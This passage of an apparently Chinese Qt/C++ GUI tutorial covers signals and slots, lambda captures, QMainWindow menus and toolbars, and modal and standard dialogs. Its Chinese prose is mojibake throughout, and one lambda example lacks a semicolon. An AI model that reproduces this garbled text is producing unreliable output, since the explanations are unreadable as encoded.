hungury();//åªéœ€è¦å£°æ˜ï¼Œä¸éœ€è¦å®ç°\n\tå­¦ç”Ÿç±»ä¸­å£°æ˜æ§½   è¯·å®¢ treat\n\tpublic slots://æ—©æœŸQtç‰ˆæœ¬ å¿…é¡»è¦å†™åˆ°public slotsï¼Œé«˜çº§ç‰ˆæœ¬å¯ä»¥å†™åˆ° publicæˆ–è€…å…¨å±€ä¸‹\n       void treat();//éœ€è¦å£°æ˜ï¼Œéœ€è¦å®ç°\n\tåœ¨çª—å£ä¸­å£°æ˜ä¸€ä¸ªå…¬å…±æ–¹æ³•ä¸‹è¯¾ï¼Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨ä¼šè§¦å‘è€å¸ˆé¥¿äº†è¿™ä¸ªä¿¡å·ï¼Œè€Œå“åº”æ§½å‡½æ•°å­¦ç”Ÿè¯·å®¢\n\tvoid MyWidget::ClassIsOver()\n{\n    //ä¸‹è¯¾å‡½æ•°ï¼Œè°ƒç”¨åï¼Œè§¦å‘è€å¸ˆé¥¿äº†çš„ä¿¡å·\n    emit teacher->hungury();\n}\n\tå­¦ç”Ÿå“åº”äº†æ§½å‡½æ•°ï¼Œå¹¶ä¸”æ‰“å°ä¿¡æ¯\n//è‡ªå®šä¹‰æ§½å‡½æ•° å®ç°\nvoid Student::treat()\n{\n       qDebug() << \"è¯·è€å¸ˆåƒé¥­ï¼\";\n}\nå®šä¹‰å¯¹è±¡\n    teacher = new Teacher(this);\n    student = new Student(this);\n\nåœ¨çª—å£ä¸­è¿æ¥ä¿¡å·æ§½    connect(teacher,&Teacher::hungury,student,&Student::treat);\nå¹¶ä¸”è°ƒç”¨ä¸‹è¯¾å‡½æ•°ï¼Œæµ‹è¯•æ‰“å°å‡º â€œè¯·è€å¸ˆåƒé¥­ï¼â€\nClassIsOver();\n```\n\n**è‡ªå®šä¹‰ä¿¡å·å’Œå‘ç”Ÿé‡è½½çš„è§£å†³åŠæ³•**\n\n```c\nè‡ªå®šä¹‰çš„ä¿¡å· hungryå¸¦å‚æ•°ï¼Œéœ€è¦æä¾›é‡è½½çš„è‡ªå®šä¹‰ä¿¡å·å’Œ è‡ªå®šä¹‰æ§½\nvoid hungury(QString name);  è‡ªå®šä¹‰ä¿¡å·\nvoid treat(QString name );    è‡ªå®šä¹‰æ§½\nä½†æ˜¯ç”±äºæœ‰ä¸¤ä¸ªé‡åçš„è‡ªå®šä¹‰ä¿¡å·å’Œè‡ªå®šä¹‰çš„æ§½ï¼Œç›´æ¥è¿æ¥ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨å‡½æ•°æŒ‡é’ˆæ¥æŒ‡å‘å‡½æ•°åœ°å€ï¼Œ ç„¶ååœ¨åšè¿æ¥\nvoid (Teacher:: * teacherSingal)(QString) = &Teacher::hungury;\nvoid (Student:: * studentSlot)(QString) = &Student::treat;\nconnect(teacher,teacherSingal,student,studentSlot);\n```\n\n### Lambda è¡¨è¾¾å¼\n\n> C++11 ä¸­çš„ Lambda è¡¨è¾¾å¼**ç”¨äºå®šä¹‰å¹¶åˆ›å»ºåŒ¿åçš„å‡½æ•°å¯¹è±¡**ï¼Œä»¥ç®€åŒ–ç¼–ç¨‹å·¥ä½œã€‚ç”¨ Lambda è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦åœ¨ç±»ä¸­å¯¹æ§½å‡½æ•°åšä»»ä½•çš„å£°æ˜äº†ã€‚Lambda è¡¨è¾¾å¼æ˜¯ C++ 11 çš„å†…å®¹ï¼Œåœ¨æ¯”è¾ƒä½çš„ Qtç‰ˆæœ¬ä¸­ï¼Œè¦æ³¨æ„åœ¨ Pro é¡¹ç›®æ–‡ä»¶ä¸­åŠ å…¥  CONFIG += C++ 11ã€‚\n\n**Lambdaè¡¨è¾¾å¼çš„åŸºæœ¬æ„æˆï¼š**\n\n```c\n[capture](parameters) mutable ->return-type\n{\n\tstatement\n}\n//[å¤–éƒ¨å˜é‡è®¿é—®æ–¹å¼è¯´æ˜ç¬¦](æ“ä½œç¬¦é‡è½½å‡½æ•°å‚æ•°)mutable ->å‡½æ•°è¿”å›å€¼{å‡½æ•°ä½“}\n```\n\n**â‘  å¤–éƒ¨å˜é‡è®¿é—®æ–¹å¼è¯´æ˜ç¬¦**\n\n`[]`ï¼Œæ ‡è¯†ä¸€ä¸ª Lambda çš„å¼€å§‹ï¼Œè¿™éƒ¨åˆ†å¿…é¡»å­˜åœ¨ï¼Œ**ä¸èƒ½çœç•¥**ã€‚**å¤–éƒ¨å˜é‡è®¿é—®æ–¹å¼è¯´æ˜ç¬¦**åªèƒ½ä½¿ç”¨å®šä¹‰ Lambda ä¸ºæ­¢æ—¶ Lambda æ‰€åœ¨ä½œç”¨èŒƒå›´å†…å¯è§çš„å±€éƒ¨å˜é‡ï¼ˆåŒ…æ‹¬ Lambda æ‰€åœ¨ç±»çš„ thisï¼‰ã€‚å¤–éƒ¨å˜é‡è®¿é—®æ–¹å¼è¯´æ˜ç¬¦æœ‰ä»¥ä¸‹å½¢å¼ï¼š\n\n- `ç©º`ã€‚æ²¡æœ‰ä½¿ç”¨ä»»ä½•å‡½æ•°å¯¹è±¡å‚æ•°ã€‚\n\n- `=`ã€‚å‡½æ•°ä½“å†…å¯ä»¥ä½¿ç”¨ Lambda æ‰€åœ¨ä½œç”¨èŒƒå›´å†…æ‰€æœ‰å¯è§çš„å±€éƒ¨å˜é‡ï¼ˆåŒ…æ‹¬Lambdaæ‰€åœ¨ç±»çš„thisï¼‰ï¼Œå¹¶ä¸”æ˜¯**å€¼ä¼ é€’æ–¹å¼**ï¼ˆç›¸å½“äºç¼–è¯‘å™¨è‡ªåŠ¨ä¸ºæˆ‘ä»¬æŒ‰**å€¼**ä¼ é€’äº†æ‰€æœ‰å±€éƒ¨å˜é‡ï¼‰ã€‚\n\n-  `&`ã€‚å‡½æ•°ä½“å†…å¯ä»¥ä½¿ç”¨ Lambda æ‰€åœ¨ä½œç”¨èŒƒå›´å†…æ‰€æœ‰å¯è§çš„å±€éƒ¨å˜é‡ï¼ˆåŒ…æ‹¬Lambdaæ‰€åœ¨ç±»çš„thisï¼‰ï¼Œå¹¶ä¸”æ˜¯**å¼•ç”¨ä¼ é€’æ–¹å¼**ï¼ˆç›¸å½“äºç¼–è¯‘å™¨è‡ªåŠ¨ä¸ºæˆ‘ä»¬æŒ‰**å¼•ç”¨**ä¼ é€’äº†æ‰€æœ‰å±€éƒ¨å˜é‡ï¼‰ã€‚\n\n- `this`ã€‚å‡½æ•°ä½“å†…å¯ä»¥ä½¿ç”¨ Lambda æ‰€åœ¨ç±»ä¸­çš„æˆå‘˜å˜é‡ã€‚\n\n- `a`ã€‚å°† a æŒ‰å€¼è¿›è¡Œä¼ é€’ã€‚æŒ‰å€¼è¿›è¡Œä¼ é€’æ—¶ï¼Œå‡½æ•°ä½“å†…ä¸èƒ½ä¿®æ”¹ä¼ é€’è¿›æ¥çš„ a çš„æ‹·è´ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹å‡½æ•°æ˜¯const çš„ã€‚**è¦ä¿®æ”¹ä¼ é€’è¿›æ¥çš„ a çš„æ‹·è´**ï¼Œå¯ä»¥æ·»åŠ  **mutable** ä¿®é¥°ç¬¦ã€‚\n\n- `&a`ã€‚å°† a æŒ‰å¼•ç”¨è¿›è¡Œä¼ é€’ã€‚\n\n- `a, &b`ã€‚å°† a æŒ‰å€¼è¿›è¡Œä¼ é€’ï¼Œb æŒ‰å¼•ç”¨è¿›è¡Œä¼ é€’ã€‚\n\n- `=ï¼Œ&a, &b`ã€‚é™¤ a å’Œ b æŒ‰å¼•ç”¨è¿›è¡Œä¼ é€’å¤–ï¼Œå…¶ä»–å‚æ•°éƒ½æŒ‰å€¼è¿›è¡Œä¼ é€’ã€‚\n\n- `&, a, b`ã€‚é™¤ a å’Œ b æŒ‰å€¼è¿›è¡Œä¼ é€’å¤–ï¼Œå…¶ä»–å‚æ•°éƒ½æŒ‰å¼•ç”¨è¿›è¡Œä¼ é€’ã€‚\n\n**â‘¡ æ“ä½œç¬¦é‡è½½å‡½æ•°å‚æ•°**\n\næ ‡è¯†é‡è½½çš„ () æ“ä½œç¬¦çš„å‚æ•°ï¼Œæ²¡æœ‰å‚æ•°æ—¶ï¼Œè¿™éƒ¨åˆ†å¯ä»¥çœç•¥ã€‚å‚æ•°å¯ä»¥é€šè¿‡æŒ‰å€¼ï¼ˆå¦‚ï¼š(a,b)ï¼‰å’ŒæŒ‰å¼•ç”¨ï¼ˆå¦‚ï¼š(&a,&b)ï¼‰ä¸¤ç§æ–¹å¼è¿›è¡Œä¼ é€’ã€‚\n\n**â‘¢ å¯ä¿®æ”¹æ ‡ç¤ºç¬¦**\n\n`mutable`ï¼Œè¿™éƒ¨åˆ†å¯ä»¥çœç•¥ã€‚æŒ‰å€¼ä¼ é€’å‡½æ•°å¯¹è±¡å‚æ•°æ—¶ï¼ŒåŠ ä¸Š mutable ä¿®é¥°ç¬¦åï¼Œå¯ä»¥ä¿®æ”¹æŒ‰å€¼ä¼ é€’è¿›æ¥çš„æ‹·è´ï¼ˆ**æ³¨æ„æ˜¯èƒ½ä¿®æ”¹æ‹·è´ï¼Œè€Œä¸æ˜¯å€¼æœ¬èº«**ï¼‰ã€‚\n\n```c\nQPushButton * myBtn = new QPushButton (this);\nQPushButton * myBtn2 = new QPushButton (this);\nmyBtn2->move(100,100);\nint m = 10;\n\nconnect(myBtn,&QPushButton::clicked,this,[m] ()mutable { m = 100 + 10; qDebug() << m; });//m=110\nconnect(myBtn2,&QPushButton::clicked,this,[=] ()  { qDebug() << m; });//m=10\nqDebug() << m;//m=10\n\n```\n\n**â‘£ å‡½æ•°è¿”å›å€¼**\n\n`->è¿”å›å€¼ç±»å‹`ï¼Œæ ‡è¯†å‡½æ•°è¿”å›å€¼çš„ç±»å‹ï¼Œå½“è¿”å›å€¼ä¸ºvoidï¼Œæˆ–è€…å‡½æ•°ä½“ä¸­åªæœ‰ä¸€å¤„ return çš„åœ°æ–¹ï¼ˆæ­¤æ—¶ç¼–è¯‘å™¨å¯ä»¥è‡ªåŠ¨æ¨æ–­å‡ºè¿”å›å€¼ç±»å‹ï¼‰æ—¶ï¼Œè¿™éƒ¨åˆ†å¯ä»¥çœç•¥ã€‚\n\n```c\nint ret = []()->int{return 1000}();\nqDebug() << \"ret=\" << ret; //ret=1000\n```\n\n**â‘¤ å‡½æ•°ä½“**\n\n  {}ï¼Œæ ‡è¯†å‡½æ•°çš„å®ç°ï¼Œè¿™éƒ¨åˆ†ä¸èƒ½çœç•¥ï¼Œä½†å‡½æ•°ä½“å¯ä»¥ä¸ºç©ºã€‚\n\n**æ‰©å±•çŸ¥è¯†ï¼š æŒ‰å€¼ä¼ é€’ä¸æŒ‰å¼•ç”¨ä¼ é€’çš„åŒºåˆ«ï¼Ÿ**\n\næŒ‰å€¼ä¼ é€’ï¼Œä¸ä¼šæ”¹å˜å½“å‰è°ƒç”¨å‡½æ•°é‡Œå®å‚ï¼ŒæŒ‰å¼•ç”¨ä¼ å€¼ï¼Œä¼šæ”¹å˜è°ƒç”¨é‡Œé¢å®å‚ã€‚ æŒ‰å€¼ä¼ é€’ï¼Œå¯ä»¥ä¿æŠ¤å®å‚ä¸è¢«ä¿®æ”¹ï¼Œæ•ˆç‡æ¯”è¾ƒä½ã€‚ æŒ‰å¼•ç”¨ä¼ å€¼ï¼Œæœ¬è´¨æ˜¯ä¼ é€’ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘åœ°å€å€¼ï¼Œå®å‚ä¼šå‘ç”Ÿä¿®æ”¹ï¼Œæ•ˆç‡æ›´é«˜ã€‚\n\n## QMainWindow\n\nQMainWindowæ˜¯ä¸€ä¸ªä¸ºç”¨æˆ·æä¾›ä¸»çª—å£ç¨‹åºçš„ç±»ï¼ŒåŒ…å«ä¸€ä¸ªèœå•æ ï¼ˆmenu barï¼‰ã€å¤šä¸ªå·¥å…·æ (tool bars)ã€å¤šä¸ªé”šæ¥éƒ¨ä»¶(dock widgets)ã€ä¸€ä¸ªçŠ¶æ€æ (status bar)åŠä¸€ä¸ªä¸­å¿ƒéƒ¨ä»¶(central widget)ï¼Œæ˜¯è®¸å¤šåº”ç”¨ç¨‹åºçš„åŸºç¡€ï¼Œå¦‚æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå›¾ç‰‡ç¼–è¾‘å™¨ç­‰ã€‚\n\n![](https://img.jwt1399.top//img/20210703152943.png)\n\n### èœå•æ ï¼ˆQMenuBarï¼‰\n\nä¸€ä¸ªä¸»çª—å£æœ€å¤šåªæœ‰ä¸€ä¸ªèœå•æ ã€‚ä½äºä¸»çª—å£é¡¶éƒ¨ã€ä¸»çª—å£æ ‡é¢˜æ ä¸‹é¢ã€‚\n\n```c\n//åˆ›å»ºèœå• åªèƒ½ä¸€ä¸ª\nQMenuBar * bar =  menuBar();\n//æ·»åŠ åˆ°çª—å£ä¸­\nsetMenuBar(bar);\n//èœå•æ \nQMenu * fileMenu = bar->addMenu(\"æ–‡ä»¶\");\nQMenu * editMenu = bar->addMenu(\"ç¼–è¾‘\");\n//èœå•é¡¹\nQAction * newAction = fileMenu->addAction(\"æ–°å»º\");\n//æ·»åŠ åˆ†å‰²çº¿\nfileMenu->addSeparator();\nQAction * openAction = fileMenu->addAction(\"æ‰“å¼€\");\n```\n\n![èœå•æ æ•ˆæœå›¾](https://img.jwt1399.top//img/20210703153740.png)\n\n### å·¥å…·æ ï¼ˆQToolBarï¼‰\n\nä¸»çª—å£çš„å·¥å…·æ ä¸Šå¯ä»¥æœ‰å¤šä¸ªå·¥å…·æ¡ï¼Œé€šå¸¸é‡‡ç”¨ä¸€ä¸ªèœå•å¯¹åº”ä¸€ä¸ªå·¥å…·æ¡çš„çš„æ–¹å¼ï¼Œä¹Ÿå¯æ ¹æ®éœ€è¦è¿›è¡Œå·¥å…·æ¡çš„åˆ’åˆ†ã€‚\n\n- ç›´æ¥è°ƒç”¨QMainWindowç±»çš„addToolBarï¼ˆï¼‰å‡½æ•°è·å–ä¸»çª—å£çš„å·¥å…·æ¡å¯¹è±¡ï¼Œæ¯å¢åŠ ä¸€ä¸ªå·¥å…·æ¡éƒ½éœ€è¦è°ƒç”¨ä¸€æ¬¡è¯¥å‡½æ•°ã€‚\n\n- æ’å…¥å±äºå·¥å…·æ¡çš„åŠ¨ä½œï¼Œå³åœ¨å·¥å…·æ¡ä¸Šæ·»åŠ æ“ä½œã€‚é€šè¿‡QToolBarç±»çš„addActionå‡½æ•°æ·»åŠ ã€‚\n\n-  å·¥å…·æ¡æ˜¯ä¸€ä¸ªå¯ç§»åŠ¨çš„çª—å£ï¼Œå®ƒçš„åœé åŒºåŸŸç”±QToolBarçš„allowAreaså†³å®šï¼ŒåŒ…æ‹¬ï¼š\n  - Qt::LeftToolBarArea   åœé åœ¨å·¦ä¾§\n  -  Qt::RightToolBarArea   åœé åœ¨å³ä¾§\n  -  Qt::TopToolBarArea    åœé åœ¨é¡¶éƒ¨\n  - Qt::BottomToolBarArea   åœé åœ¨åº•éƒ¨\n  - Qt::AllToolBarAreas   ä»¥ä¸Šå››ä¸ªä½ç½®éƒ½å¯åœé \n\n- ä½¿ç”¨setAllowedAreasï¼ˆï¼‰å‡½æ•°æŒ‡å®šåœé åŒºåŸŸï¼š\n\n`setAllowedAreasï¼ˆQt::LeftToolBarArea | Qt::RightToolBarAreaï¼‰`\n\n- ä½¿ç”¨setMoveableï¼ˆï¼‰å‡½æ•°è®¾å®šå·¥å…·æ çš„å¯ç§»åŠ¨æ€§ï¼š\n\n`setMoveableï¼ˆfalseï¼‰`//å·¥å…·æ¡ä¸å¯ç§»åŠ¨, åªèƒ½åœé åœ¨åˆå§‹åŒ–çš„ä½ç½®ä¸Š\n\nä»£ç æ‰¿æ¥ä¸Šé¢èœå•æ éƒ¨åˆ†ä»£ç \n\n```c\n//åˆ›å»ºå·¥å…·æ  å¯ä»¥å¤šä¸ª\nQToolBar * toolBar = new QToolBar(this);\n//æ·»åŠ åˆ°çª—å£ï¼Œè®¾ç½®é»˜è®¤åœé åŒºåŸŸ\naddToolBar(Qt::LeftToolBarArea,toolBar);\n//è®¾ç½®å…è®¸çš„åœé åŒºåŸŸ å·¦å³åœé \ntoolBar->setAllowedAreas(Qt::LeftToolBarArea | Qt::RightToolBarArea);\n//è®¾ç½®æµ®åŠ¨ ä¸å¯æµ®åŠ¨\ntoolBar->setFloatable(false);\n//è®¾ç½®ç§»åŠ¨ ä¸å¯ç§»åŠ¨\ntoolBar->setMovable(false);\n//å·¥å…·æ \ntoolBar->addAction(newAction);\ntoolBar->addSeparator(); //æ·»åŠ åˆ†å‰²çº¿\ntoolBar->addAction(openAction);\n//å·¥å…·æ æ·»åŠ æ§ä»¶\nQPushButton * btn = new QPushButton(\"æŒ‰é’®\",this);\ntoolBar->addWidget(btn);\n```\n\n![å·¥å…·æ æ•ˆæœå›¾](https://img.jwt1399.top//img/20210703155003.png)\n\n### çŠ¶æ€æ ï¼ˆQStatusBarï¼‰\n\nQStatusBar æ´¾ç”Ÿè‡ª QWidget ç±»ï¼Œä½¿ç”¨æ–¹æ³•ä¸ QWidget ç±»ä¼¼ï¼ŒçŠ¶æ€æ åªèƒ½æœ‰ä¸€ä¸ªã€‚\n\nä»£ç æ‰¿æ¥ä¸Šé¢\n\n```c\n//åˆ›å»ºçŠ¶æ€æ  åªèƒ½ä¸€ä¸ª\nQStatusBar *stBar = statusBar();\n//è®¾ç½®åˆ°çª—å£ä¸­\nsetStatusBar(stBar);\n//çŠ¶æ€æ æ·»åŠ æ ‡ç­¾æ§ä»¶\nQLabel * label = new QLabel(\"æç¤ºä¿¡æ¯\",this);\nstBar->addWidget(label);\nQLabel * label2 = new QLabel(\"å³ä¾§æç¤ºä¿¡æ¯\",this);\nstBar->addPermanentWidget(label2);\n```\n\n![çŠ¶æ€æ æ•ˆæœå›¾](https://img.jwt1399.top//img/20210703155435.png)\n\n### é“†æ¥éƒ¨ä»¶ï¼ˆQDockWidgetï¼‰\n\né“†æ¥éƒ¨ä»¶ QDockWidgetï¼Œä¹Ÿç§°æµ®åŠ¨çª—å£ï¼Œå¯ä»¥æœ‰å¤šä¸ªã€‚\n\n```c\n//æµ®åŠ¨çª—å£ å¯ä»¥å¤šä¸ª\nQDockWidget * dockWidget = new QDockWidget(\"æµ®åŠ¨çª—å£\",this);\n//è®¾ç½®åˆ°çª—å£ä¸­\naddDockWidget(Qt::BottomDockWidgetArea,dockWidget);\n//è®¾ç½®å…è®¸çš„åœé åŒºåŸŸ ä¸Šä¸‹åœé \ndockWidget->setAllowedAreas(Qt::TopDockWidgetArea | Qt::BottomDockWidgetArea);\n```\n\n![æµ®åŠ¨çª—å£æ•ˆæœå›¾](https://img.jwt1399.top//img/20210703155733.png)\n\n### ä¸­å¿ƒéƒ¨ä»¶ï¼ˆCentralWidgetï¼‰\n\né™¤äº†ä»¥ä¸Šå‡ ä¸ªéƒ¨ä»¶ï¼Œä¸­å¿ƒæ˜¾ç¤ºçš„éƒ¨ä»¶éƒ½å¯ä»¥ä½œä¸ºæ ¸å¿ƒéƒ¨ä»¶ï¼Œä¾‹å¦‚ä¸€ä¸ªè®°äº‹æœ¬æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨QTextEditåšæ ¸å¿ƒéƒ¨ä»¶ï¼Œä¸­å¿ƒéƒ¨ä»¶åªèƒ½æœ‰ä¸€ä¸ªã€‚\n\n```c\n//è®¾ç½®ä¸­å¿ƒéƒ¨ä»¶ åªèƒ½ä¸€ä¸ª\nQTextEdit * edit =new  QTextEdit(this);\nsetCentralWidget(edit);\n```\n\n![ä¸­å¿ƒéƒ¨ä»¶æ•ˆæœå›¾](https://img.jwt1399.top//img/20210703160052.png)\n\n## èµ„æºæ–‡ä»¶æ·»åŠ \n\n1.å°†å›¾ç‰‡æ–‡ä»¶æ‹·è´åˆ°é¡¹ç›®ä½ç½®ä¸‹\n\n2.å³é”®é¡¹ç›®->æ·»åŠ æ–°æ–‡ä»¶ â€“> Qt - > Qt recourse File  - >ç»™èµ„æºæ–‡ä»¶èµ·åxxxï¼Œåˆ›å»ºåç”Ÿæˆ  xxx.qrc \n\n3.å³é”® xxx.qrc ï¼Œé€‰æ‹© open in editor ç¼–è¾‘èµ„æºï¼Œæ·»åŠ å‰ç¼€ã€æ·»åŠ æ–‡ä»¶\n\n4.ä½¿ç”¨Qtèµ„æº  â€œ : + å‰ç¼€å + æ–‡ä»¶å â€  egï¼š`ui->actionnew->setIcon(QIcon(\":/icon/image/jj.ico\"));`\n\n## å¯¹è¯æ¡†ï¼ˆQDialogï¼‰\n\nå¯¹è¯æ¡†åˆ†ä¸ºæ¨¡æ€å¯¹è¯æ¡†å’Œéæ¨¡æ€å¯¹è¯æ¡†ã€‚æ¨¡æ€å¯¹è¯æ¡†ï¼Œä¼šé˜»å¡åŒä¸€åº”ç”¨ç¨‹åºä¸­å…¶å®ƒçª—å£çš„è¾“å…¥ã€‚éæ¨¡æ€å¯¹è¯æ¡†ï¼Œä¸ä¼šé˜»å¡åŒä¸€åº”ç”¨ç¨‹åºä¸­å…¶å®ƒçª—å£çš„è¾“å…¥ã€‚\n\næ¨¡æ€å¯¹è¯æ¡†å¾ˆå¸¸è§ï¼Œæ¯”å¦‚â€œæ‰“å¼€æ–‡ä»¶â€åŠŸèƒ½ã€‚ä½ å¯ä»¥å°è¯•ä¸€ä¸‹è®°äº‹æœ¬çš„æ‰“å¼€æ–‡ä»¶ï¼Œå½“æ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†å‡ºç°æ—¶ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½å¯¹é™¤æ­¤å¯¹è¯æ¡†ä¹‹å¤–çš„çª—å£éƒ¨åˆ†è¿›è¡Œæ“ä½œçš„ã€‚éæ¨¡æ€å¯¹è¯æ¡†ï¼Œä¾‹å¦‚æŸ¥æ‰¾å¯¹è¯æ¡†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ˜¾ç¤ºç€æŸ¥æ‰¾å¯¹è¯æ¡†çš„åŒæ—¶ï¼Œç»§ç»­å¯¹è®°äº‹æœ¬çš„å†…å®¹è¿›è¡Œç¼–è¾‘ã€‚\n\n### æ¨¡æ€å¯¹è¯æ¡†\n\n```c\n//æ¨¡æ€å¯¹è¯æ¡†\nconnect(ui->actionnew,&QAction::triggered,[=](){\n    QDialog dlg(this); \n    dlg.resize(300,100);//è®¾ç½®å¯¹è¯æ¡†å¤§å°\n    dlg.setWindowTitle(tr(\"Hello, Model dialog!\"));//è®¾ç½®å¯¹è¯æ¡†æ ‡é¢˜\n    dlg.setWindowIcon(QIcon(\":/icon/image/jj.ico\")); //è®¾ç½®å¯¹è¯æ¡†å›¾æ ‡\n    dlg.exec();\n    qDebug() << \"æ¨¡æ€å¯¹è¯æ¡†å¼¹å‡ºäº†\";\n});\n```\n\n![æ¨¡æ€å¯¹è¯æ¡†](https://img.jwt1399.top//img/20210704094358.png)\n\n### éæ¨¡æ€å¯¹è¯æ¡†\n\n```c\n//éæ¨¡æ€å¯¹è¯æ¡†\nconnect(ui->actionnew,&QAction::triggered,[=](){\n    QDialog * dlg = new QDialog (this); //é˜²æ­¢ä¸€é—ªè€Œè¿‡ï¼Œåˆ›å»ºåˆ°å †åŒº\n    dlg->resize(300,100); //è®¾ç½®å¯¹è¯æ¡†å¤§å°\n    dlg->setWindowTitle(tr(\"Hello, Modeless dialog!\")); //è®¾ç½®å¯¹è¯æ¡†æ ‡é¢˜\n    dlg->setWindowIcon(QIcon(\":/icon/image/jj.ico\")); //è®¾ç½®å¯¹è¯æ¡†å›¾æ ‡\n    dlg->show();\n    dlg->setAttribute(Qt::WA_DeleteOnClose); // 55å·å±æ€§ å¯¹è¯æ¡†å…³é—­æ—¶ï¼Œè‡ªåŠ¨é”€æ¯å¯¹è¯æ¡†ã€‚\n    qDebug() << \"éæ¨¡æ€å¯¹è¯æ¡†å¼¹å‡ºäº†\";\n});\n```\n\n![éæ¨¡æ€å¯¹è¯æ¡†](https://img.jwt1399.top//img/20210704094508.png)\n\n## æ ‡å‡†å¯¹è¯æ¡†\n\n> æ ‡å‡†å¯¹è¯æ¡†ï¼Œæ˜¯ Qt å†…ç½®çš„ä¸€ç³»åˆ—å¯¹è¯æ¡†ï¼Œç”¨äºç®€åŒ–å¼€å‘ã€‚äº‹å®ä¸Šï¼Œæœ‰å¾ˆå¤šå¯¹è¯æ¡†éƒ½æ˜¯é€šç”¨çš„ï¼Œæ¯”å¦‚æ‰“å¼€æ–‡ä»¶ã€è®¾ç½®é¢œè‰²ã€æ‰“å°è®¾ç½®ç­‰ã€‚è¿™äº›å¯¹è¯æ¡†åœ¨æ‰€æœ‰ç¨‹åºä¸­å‡ ä¹ç›¸åŒï¼Œå› æ­¤æ²¡æœ‰å¿…è¦åœ¨æ¯ä¸€ä¸ªç¨‹åºä¸­éƒ½è‡ªå·±å®ç°è¿™ä¹ˆä¸€ä¸ªå¯¹è¯æ¡†ã€‚\n\nQt çš„å†…ç½®å¯¹è¯æ¡†å¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š\n\n- QColorDialogï¼š    é€‰æ‹©é¢œè‰²ï¼›\n- QFileDialogï¼š    é€‰æ‹©æ–‡ä»¶æˆ–è€…ç›®å½•ï¼›\n- QFontDialogï¼š    é€‰æ‹©å­—ä½“ï¼›\n- QInputDialogï¼š    å…è®¸ç”¨æˆ·è¾“å…¥ä¸€ä¸ªå€¼ï¼Œå¹¶å°†å…¶å€¼è¿”å›ï¼›\n- QMessageBoxï¼š     æ¨¡æ€å¯¹è¯æ¡†ï¼Œç”¨äºæ˜¾ç¤ºä¿¡æ¯ã€è¯¢é—®é—®é¢˜ç­‰ï¼›\n- QPageSetupDialogï¼š  ä¸ºæ‰“å°æœºæä¾›çº¸å¼ ç›¸å…³çš„é€‰é¡¹ï¼›\n- QPrintDialogï¼š    æ‰“å°æœºé…ç½®ï¼›\n- QPrintPreviewDialogï¼šæ‰“å°é¢„è§ˆï¼›\n- QProgressDialogï¼š  æ˜¾ç¤ºæ“ä½œè¿‡ç¨‹ã€‚\n\n### æ¶ˆæ¯å¯¹è¯æ¡†ï¼ˆQMessageBoxï¼‰\n\n```c\n//æ¶ˆæ¯å¯¹è¯æ¡†\nconnect(ui->actionopen,&QAction::triggered,[=](){\n    //é”™è¯¯å¯¹è¯æ¡†\n    QMessageBox::critical(this,\"é”™è¯¯å¯¹è¯æ¡†\",\"é”™è¯¯ä¿¡æ¯\");\n\n    //ä¿¡æ¯å¯¹è¯æ¡†\n    QMessageBox::information(this,\"æç¤ºå¯¹è¯æ¡†\",\"æç¤ºä¿¡æ¯\");\n\n    //æé—®å¯¹è¯æ¡†\n    //å‚æ•°1:çˆ¶äº²  å‚æ•°2:æ ‡é¢˜  å‚æ•°3:æç¤ºå†…å®¹  å‚æ•°4:æŒ‰é”®ç±»å‹  å‚æ•°5:é»˜è®¤å…³è”å›è½¦æŒ‰é”®\n    QMessageBox::question(this,\"æé—®å¯¹è¯æ¡†\",\"æé—®ä¿¡æ¯\",QMessageBox::Save|QMessageBox::Cancel);\n\n    //è­¦å‘Šå¯¹è¯æ¡†\n    QMessageBox::warning(this,\"è­¦å‘Šå¯¹è¯æ¡†\",\"è­¦å‘Šä¿¡æ¯\");\n\n    //å…³äºå¯¹è¯æ¡†\n    QMessageBox::about(this,\"å…³äº\",\"By ç®€ç®€\");\n    QMessageBox::aboutQt(this);\n});\n```\n\n### é¢œè‰²å¯¹è¯æ¡†ï¼ˆQColorDialogï¼‰\n\n```c\nQColor color =  QColorDialog::getColor(QColor(255,0,0));\nqDebug() << \"r = \" << color.red() << \" g = \" << color.green() << \" b  = \" << color.blue() ;\n```\n\n### æ–‡ä»¶å¯¹è¯æ¡†ï¼ˆQFileDialogï¼‰\n\n```c\n//å‚æ•°1:çˆ¶äº²  å‚æ•°2:æ ‡é¢˜   å‚æ•°3:é»˜è®¤æ‰“å¼€è·¯å¾„  å‚æ•°4:è¿‡æ»¤æ–‡ä»¶æ ¼å¼     \nQString str = QFileDialog::getOpenFileName(this,\"æ‰“å¼€æ–‡ä»¶\",\"C:\\\\Users\\\\admin\\\\Desktop\",\"(*.txt)\");\nqDebug() << str; // è¿”å›å€¼æ˜¯é€‰å–çš„è·¯å¾„\n```\n\n### å­—ä½“å¯¹è¯æ¡†ï¼ˆQFontDialogï¼‰\n\n```c\nbool  flag;\nQFont font = QFontDialog::getFont(&flag,QFont(\"åæ–‡å½©äº‘\",36));\nqDebug() << \"å­—ä½“:\"<< font.family().toUtf8().data() << \"å­—å·:\" << font.pointSize() << \"æ˜¯å¦åŠ ç²—:\" << font.bold() << \"æ˜¯å¦å€¾æ–œ:\" << font.italic();\n```\n\n## å¸¸ç”¨æ§ä»¶\n\n### Buttons\n\n-  **å¸¸ç”¨æŒ‰é’®(Push Button)** QPushButton\n\n- **å·¥å…·æŒ‰é’®(Tool Button)** QToolButton  ç”¨äºæ˜¾ç¤ºå›¾ç‰‡ï¼Œå¦‚æœæƒ³æ˜¾ç¤ºæ–‡å­—ï¼Œä¿®æ”¹é£æ ¼ï¼štoolButtonStyle ï¼Œ å‡¸èµ·é£æ ¼autoRaise\n\n-  **å•é€‰æŒ‰é’®(Radio Button)** QRadioButtonï¼Œè®¾ç½®é»˜è®¤ ui->rBtnMan->setChecked(true); \n\n- **å¤šé€‰æŒ‰é’®(Check Box)**  QCheckBox ï¼Œç›‘å¬çŠ¶æ€ï¼Œ2 é€‰ä¸­ 1 åŠé€‰ 0 